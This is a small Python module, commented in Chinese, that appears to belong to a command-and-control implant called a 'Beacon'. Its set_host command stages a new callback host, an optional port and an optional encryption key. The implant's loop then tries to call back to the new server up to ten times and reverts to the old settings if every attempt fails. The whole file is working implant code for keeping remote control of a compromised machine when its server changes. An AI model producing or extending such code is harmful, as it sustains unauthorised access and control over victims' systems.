"""
@module: set_host
@desc: 修改 Beacon 回连地址(host 必填; port/key 可选——不填则保持不变),验证后生效,失败自动回退
"""
MODULE = {
    "desc": "修改 Beacon 回连地址(port/key 可选,不填保持不变;最多回连验证 10 次,失败自动回退)",
    "params": [
        ("host", "必填"),
        ("port", "可选；不填则保持原端口不变"),
        ("key_hex", "可选；64 字符 hex, 不填则保持原密钥不变(改 key 需同步 Server 配置)"),
    ],
}


def run(host, port=None, key_hex=None):
    """新参数写入 _SET_PENDING, 主循环用新参数回连验证:
    成功(welcome)即生效; 连续 10 次失败回退原连接参数。

    host 必填; port/key_hex 可选——传空串/None 表示该项不变(保留原值)。
    """
    _sp = globals().get("_SET_PENDING")
    if not isinstance(_sp, dict):
        _sp = {}
    _sp["host"] = host
    _msg = f"host={host}"
    if port is not None and str(port).strip() != "":
        _p = int(port)
        _sp["port"] = _p
        _msg += f" port={_p}"
    if key_hex is not None and str(key_hex).strip() != "":
        _k = bytes.fromhex(str(key_hex).strip())
        _sp["key"] = _k
        _msg += f" key {len(_k)}B"
    globals()["_SET_PENDING"] = _sp
    globals()["_SET_TRY"] = 0
    return (f"pending {_msg}——接下来最多回连验证 10 次, "
            f"成功即生效, 失败自动回退原连接参数")


if __name__ == "__main__":
    print("usage: set_host <host> [port] [key_hex](port/key 可选, 不填保持不变)")
